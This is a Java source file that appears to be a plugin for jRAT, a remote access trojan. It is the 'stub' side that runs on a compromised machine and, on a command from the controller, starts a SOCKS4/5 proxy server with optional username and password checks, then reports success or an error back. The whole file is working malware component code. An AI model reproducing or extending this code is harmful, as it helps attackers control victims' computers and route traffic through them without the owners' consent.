package se.jrat.plugin.socks.stub;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.net.InetAddress;
import java.net.Socket;
import java.util.Hashtable;
import java.util.StringTokenizer;

import jrat.api.stub.StubPlugin;
import se.jrat.plugins.socks.Global;
import socks.InetRange;
import socks.ProxyServer;
import socks.server.IdentAuthenticator;
import socks.server.ServerAuthenticatorNone;
import socks.server.UserPasswordAuthenticator;
import socks.server.UserValidation;

public class SocksPlugin extends StubPlugin {
	
	private DataInputStream dis;
	private DataOutputStream dos;
	private String error;
	private boolean success = true;
	
	@Override
	public void onStart() throws Exception {
		
	}

	@Override
	public void onDisconnect(Exception ex) throws Exception {
		
	}

	@Override
	public void onConnect(DataInputStream dis, DataOutputStream dos) throws Exception {
		this.dis = dis;
		this.dos = dos;
	}

	@Override
	public void onPacket(byte header) throws Exception {
		if (header == Global.HEADER_START) {	
			final boolean socks5 = dis.readBoolean();
			final String host = dis.readUTF();
			final int port = dis.readInt();
			final boolean auth = dis.readBoolean();
			final String user = dis.readUTF();
			final String pass = dis.readUTF();
						
			/*CProxy proxy;
			if (socks5) {
				proxy = new Socks5Proxy(host, port);
				if (auth) {
					((Socks5Proxy) proxy).setAuthenticationMethod(2, new UserPasswordAuthentication(user, pass));
				} else {
					((Socks5Proxy) proxy).setAuthenticationMethod(0, null);
				}
			} else {
				proxy = new Socks4Proxy(host, port, user);
			}*/
								
			new Thread(new Runnable() {
				public void run() {
					try {
						//IdentAuthenticator auth = new IdentAuthenticator();
						//addAuth(auth);
						ProxyServer server = new ProxyServer(socks5 && auth ? new UserPasswordAuthenticator(new UserValidation() {
							@Override
							public boolean isUserValid(String username, String password, Socket connection) {
								if (!auth) {
									return true;
								}
								return username.equals(user) && password.equals(pass);
							}			
						}) : new ServerAuthenticatorNone());
						ProxyServer.setLog(System.out);
						success = true;
						System.out.println("Setting success to true");
					    server.start(port, 5, InetAddress.getByName("127.0.0.1"));
					} catch (Exception ex) {
						System.out.println("Setting success to FALSE BECAUSE OF ERROR");
						ex.printStackTrace();
						success = false;
						error = ex.getClass().getSimpleName() + ": " + ex.getMessage();
					}
				}
			}).start();
			
			try {Thread.sleep(1000L);}catch(Exception ex) { }
			
			//while (!success && error == null) {
			//	try {Thread.sleep(5000L);}catch(Exception ex) { }
			//	System.out.println("Success: " + success + ", error: " + error);
			//}
			
			try {
				System.out.println("Writing success: " + success + " " + error);

				dos.writeBoolean(success);

				if (!success) {
					dos.writeUTF(error);
				}
				
				success = true;
				error = null;
			} catch (Exception ex1) {
				ex1.printStackTrace();
			}
		} else if (header == Global.HEADER_STOP) {
			
		}
	}
	
	static boolean addAuth(IdentAuthenticator ident) {
		String range = ".";
		InetRange irange = parseInetRange(range);

		String users = null;
		if (users == null) {
			ident.add(irange, null);
			return true;
		}
		Hashtable uhash = new Hashtable();

		StringTokenizer st = new StringTokenizer(users, ";");
		while (st.hasMoreTokens()) {
			uhash.put(st.nextToken(), "");
		}
		ident.add(irange, uhash);
		return true;
	}

	static InetRange parseInetRange(String source) {
		InetRange irange = new InetRange();

		StringTokenizer st = new StringTokenizer(source, ";");
		while (st.hasMoreTokens()) {
			irange.add(st.nextToken());
		}
		return irange;
	}

	@Override
	public void onEnable() throws Exception {
		
	}

}
